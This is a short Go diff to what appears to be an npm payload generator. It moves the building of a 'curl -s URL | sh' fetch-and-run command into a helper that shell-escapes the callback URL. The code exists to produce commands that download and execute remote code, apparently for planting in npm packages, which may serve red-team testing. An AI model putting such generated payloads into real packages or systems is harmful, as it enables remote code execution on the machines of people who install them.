@@ -45,7 +45,7 @@ func (n *NPMPayload) Generate() []GeneratedPayload {
 	var cmd string
 	switch {
 	case n.Options.CallbackURL != "":
-		cmd = fmt.Sprintf("curl -s %s | sh", n.Options.CallbackURL)
+		cmd = curlPipeShCommand(n.Options.CallbackURL)
 	case n.Options.Command != "":
 		cmd = n.Options.Command
 	default:
@@ -408,4 +408,12 @@ func escapeJS(s string) string {
 	s = strings.ReplaceAll(s, "\\", "\\\\")
 	s = strings.ReplaceAll(s, "'", "\\'")
 	return s
+}
+
+func curlPipeShCommand(callbackURL string) string {
+	return fmt.Sprintf("curl -s '%s' | sh", shellEscape(callbackURL))
+}
+
+func shellEscape(s string) string {
+	return strings.ReplaceAll(s, "'", "'\"'\"'")
 }
